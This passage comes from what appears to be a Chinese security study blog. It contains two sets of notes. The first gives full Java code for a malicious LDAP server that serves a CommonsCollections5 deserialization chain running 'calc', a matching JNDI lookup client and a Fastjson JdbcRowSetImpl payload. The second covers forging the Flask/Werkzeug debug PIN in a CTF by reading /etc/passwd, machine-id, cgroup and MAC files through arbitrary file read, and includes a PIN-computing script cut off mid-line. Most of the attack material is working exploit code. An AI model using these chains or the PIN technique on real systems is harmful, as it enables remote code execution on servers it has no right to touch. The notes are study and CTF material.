<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmitest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8081/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">4444</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$											</span></span><br><span class="line">                port,										</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="comment">// Payload1: Return Evil Reference Factory </span></span><br><span class="line">    <span class="comment">// e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line">    <span class="comment">// e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line">    <span class="comment">// e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//CommonsCollections5()可以换成 Base64.decode(&quot;cc5链条序列化加base64的内容&quot;)java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;calc&#x27;|base64</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] CommonsCollections5() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.<span class="property">rmitest</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">naming</span>.<span class="property">InitialContext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="built_in">String</span>[] args) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">Object</span> object=<span class="keyword">new </span><span class="class title_">InitialContext</span>().<span class="property">lookup</span>(<span class="string">&quot;ldap://127.0.0.1:4444/dc=example,dc=com&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作</p>
<p>模拟受害者进行JNDI lookup操作，或者使用Fastjson等漏洞模拟触发，即可看到弹计算器的命令被执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">local_obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">JSON.parse(payload);</span><br></pre></td></tr></table></figure>

<p>这种绕过方式需要利用一个本地的反序列化利用链（如CommonsCollections），然后可以结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>flask_debug_pin</title>
    <url>/2023/06/03/python_debug_pin/</url>
    <content><![CDATA[<p>Flask在debug模式下会生成一个Debugger PIN</p>
<p>通过这个pin码，可以在报错页面执行任意python代码</p>
<p>同一台机子上多次启动同一个Flask应用时，会发现这个pin码是固定的。</p>
<p>uuid是啥不重要,只是写的时候去了解了</p>
<h3 id="什么是UUID"><a href="#什么是UUID" class="headerlink" title="什么是UUID"></a>什么是UUID</h3><p><strong>UUID是一个通用唯一标识符</strong>。也可以将其称为GUID，即全局唯一标识符。</p>
<p>UUID是128位长的数字或ID，用于唯一标识计算机系统中的文档，用户，资源或信息。</p>
<ul>
<li>UUID可以保证标识符在空间和时间上的唯一性。当我们谈论空间和时间时，是指当根据标准生成UUID时，标识符不会重复已经创建的标识符或将被创建以标识其他事物的标识符。</li>
<li>因此，在需要唯一值的情况下，UUID很有用。</li>
</ul>
<p>根据**<a href="https://tools.ietf.org/html/rfc4122.html">RFC 4122</a><strong>实现的Python UUID模块 。RFC 4122是Internet协会的标准和版权（C）。</strong>R** FC 4122规范包括所有详细信息和算法，以生成所有版本的唯一标识符。RFC 4122文档指定了三种生成UUID的算法。</p>
<p>因此，使用Python UUID模块，您可以生成版本1、3、4和5 UUID。使用此模块生成的UUID是不可变的。</p>
<p>Python UUID模块支持以下版本的UUID。</p>
<ul>
<li>UUID1 –使用主机MAC地址，序列号和当前时间生成UUID。此版本使用IEEE 802 MAC地址。</li>
<li>UUID3和UUID 5使用加密哈希和应用程序提供的文本字符串来生成UUID。UUID 3使用MD5哈希，而UUID 5使用SHA-1哈希。</li>
<li>UUID4使用伪随机数生成器生成UUID。</li>
</ul>
<p>HDCTF [yamiyami]</p>
<h1 id="代码逻辑分析"><a href="#代码逻辑分析" class="headerlink" title="代码逻辑分析"></a>代码逻辑分析</h1><p>建议要去做做o(╥﹏╥)o因为这是以前的分析了，版本更新后，内容会更改，踩了坑</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>用pycharm在app.run下好断点，开启debug模式</p>
<p>大致跟踪流程如下</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">app.<span class="keyword">py</span> </span><br><span class="line"><span class="keyword">python3</span>.<span class="number">5</span>/site-packages/flask/app.<span class="keyword">py</span>  <span class="number">772</span>行左右 run_simple(host, port, self, **<span class="keyword">options</span>)</span><br><span class="line"><span class="keyword">python3</span>.<span class="number">5</span>/site-packages/werkzeug/serving.<span class="keyword">py</span> <span class="number">751</span>行左右 application = DebuggedApplication(application, use_evalex)</span><br><span class="line"><span class="keyword">python3</span>.<span class="number">5</span>/site-packages/werkzeug/<span class="keyword">debug</span>/__init__.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<p>具体可网上搜</p>
<p>最主要的就是这一段哈希部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, text_type):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>连接了两个列表，然后循环里面的值做哈希</p>
<p>这两个列表的定义</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>)),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&#x27;__file__&#x27;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        <span class="built_in">str</span>(uuid.getnode()),</span><br><span class="line">        get_machine_id(),</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username <span class="comment"># 用户名</span></span><br><span class="line"></span><br><span class="line">modname <span class="comment"># flask.app</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>)) <span class="comment"># Flask</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(mod, <span class="string">&#x27;__file__&#x27;</span>, <span class="literal">None</span>) <span class="comment"># flask目录下的一个app.py的绝对路径</span></span><br><span class="line"></span><br><span class="line">uuid.getnode() <span class="comment"># mac地址十进制</span></span><br><span class="line"></span><br><span class="line">get_machine_id() <span class="comment"># /etc/machine-id或或/proc/sys/kernel/random/boot_i</span></span><br></pre></td></tr></table></figure>

<h4 id="machine-id"><a href="#machine-id" class="headerlink" title="machine_id"></a>machine_id</h4><p>每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_id</code>，docker靶机则读取<code>/proc/self/cgroup</code>，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_generate</span>():</span><br><span class="line">        <span class="comment"># Potential sources of secret information on linux.  The machine-id</span></span><br><span class="line">        <span class="comment"># is stable across boots, the boot id is not</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&#x27;/etc/machine-id&#x27;</span>, <span class="string">&#x27;/proc/sys/kernel/random/boot_id&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X we can use the computer&#x27;s serial number assuming that</span></span><br><span class="line">        <span class="comment"># ioreg exists and can spit out that information.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Also catch import errors: subprocess may not be available, e.g.</span></span><br><span class="line">            <span class="comment"># Google App Engine</span></span><br><span class="line">            <span class="comment"># See https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line">            dump = Popen([<span class="string">&#x27;ioreg&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;IOPlatformExpertDevice&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;2&#x27;</span>],</span><br><span class="line">                         stdout=PIPE).communicate()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows we can use winreg to get the machine guid</span></span><br><span class="line">        wr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg <span class="keyword">as</span> wr</span><br><span class="line">        <span class="keyword">except</span> ImportError:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">import</span> _winreg <span class="keyword">as</span> wr</span><br><span class="line">            <span class="keyword">except</span> ImportError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> wr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> wr.OpenKey(wr.HKEY_LOCAL_MACHINE,</span><br><span class="line">                                <span class="string">&#x27;SOFTWARE\\Microsoft\\Cryptography&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">                                wr.KEY_READ | wr.KEY_WOW64_64KEY) <span class="keyword">as</span> rk:</span><br><span class="line">                    machineGuid, wrType = wr.QueryValueEx(rk, <span class="string">&#x27;MachineGuid&#x27;</span>)</span><br><span class="line">                    <span class="keyword">if</span> (wrType == wr.REG_SZ):</span><br><span class="line">                        <span class="keyword">return</span> machineGuid.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> machineGuid</span><br><span class="line">            <span class="keyword">except</span> WindowsError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    _machine_id = rv = _generate()</span><br><span class="line">    <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure>

<p>首先尝试读取<code>/etc/machine-id</code>或者 <code>/proc/sys/kernel/random/boot_i</code>中的值，若有就直接返回</p>
<p>当这6个值我们可以获取到时，就可以推算出生成的PIN码，引发任意代码执行</p>
<h1 id="配合任意文件读取"><a href="#配合任意文件读取" class="headerlink" title="配合任意文件读取"></a>配合任意文件读取</h1><p>通过debug报错,分析app.py的绝对路径</p>
<p>通过任意文件读取&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，</p>
<p>一般题目是docker环境，因此读机器id需要读&#x2F;proc&#x2F;self&#x2F;cgroup：</p>
<p>&#x2F;etc&#x2F;passwd，读取用户名</p>
<p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，读取mac地址</p>
<p>虚拟机中网卡为ens33,一般情况下应该是eth0</p>
<p>踩坑:</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">虽然爆出路径是/usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">flask</span>/<span class="title">app</span>.<span class="title">py</span>&quot;但实际是<span class="title">app</span>.<span class="title">pyc</span></span></span><br><span class="line">python不同版本不同加密<span class="number">3.6</span>采用MD5加密，<span class="number">3.8</span>采用sha1加密，所以脚本有所不同</span><br><span class="line">机器id读取顺序不同</span><br><span class="line">werkzeug <span class="number">0.15</span>.<span class="number">5</span>之前</span><br><span class="line"><span class="regexp">/etc/machine</span>-id-&gt;<span class="regexp">/proc/sys</span><span class="regexp">/kernel/random</span><span class="regexp">/boot_id-&gt;ioreg -c IOPlatformExpertDevice -d 2-&gt;HKEY_LOCAL_MACHINE/</span>SOFTWARE/Microsoft/Cryptography/MachineGuid</span><br><span class="line"></span><br><span class="line"><span class="number">0.15</span>.<span class="number">5</span>-<span class="number">0.16</span>.<span class="number">0</span></span><br><span class="line"><span class="regexp">/proc/self</span><span class="regexp">/cgroup-&gt;/etc</span><span class="regexp">/machine-id-&gt;/proc</span><span class="regexp">/sys/kernel</span><span class="regexp">/random/boot</span>_id-&gt;ioreg -c IOPlatformExpertDevice -d <span class="number">2</span>-&gt;HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid</span><br><span class="line"></span><br><span class="line"><span class="regexp">/proc/self</span><span class="regexp">/cgroup需要用正则value.strip().partition(&quot;/docker</span><span class="regexp">/&quot;)[2]分割</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">0.16.0之后</span></span><br><span class="line"><span class="regexp">/etc</span><span class="regexp">/machine-id-&gt;/proc</span><span class="regexp">/sys/kernel</span><span class="regexp">/random/boot</span>_id-&gt;<span class="regexp">/proc/self</span><span class="regexp">/cgroup-&gt;ioreg -c IOPlatformExpertDevice -d 2-&gt;HKEY_LOCAL_MACHINE/</span>SOFTWARE/Microsoft/Cryptography/MachineGuid</span><br><span class="line"></span><br><span class="line"><span class="number">2020.1</span>.<span class="number">5</span>对 machine_id() 进行了更新 ，所以<span class="number">2020.1</span>.<span class="number">5</span>之前的版本是跟这里不同的，具体更新情况可看</span><br><span class="line"><span class="symbol">https:</span>/<span class="regexp">/github.com/pallets</span><span class="regexp">/werkzeug/commit</span><span class="regexp">/617309a7c317ae1ade428de48f5bc4a906c2950f</span></span><br><span class="line"><span class="regexp">2020.1.5修改前是：</span></span><br><span class="line"><span class="regexp">是依序读取 /proc</span><span class="regexp">/self/cgroup</span>、/etc/machine-id、/proc/sys/kernel/random/boot_id 三个文件，只要读取到一个文件的内容，立马返回值。</span><br><span class="line">现在只要从 /etc/machine-id、/proc/sys/kernel/random/boot_id 中读到一个值后立即 <span class="keyword">break</span>，然后和/proc/<span class="keyword">self</span>/cgroup 中的id值拼接</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;kingkk&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;52242498922&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;19949f18ce36422da1402b3e3fe53008&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span 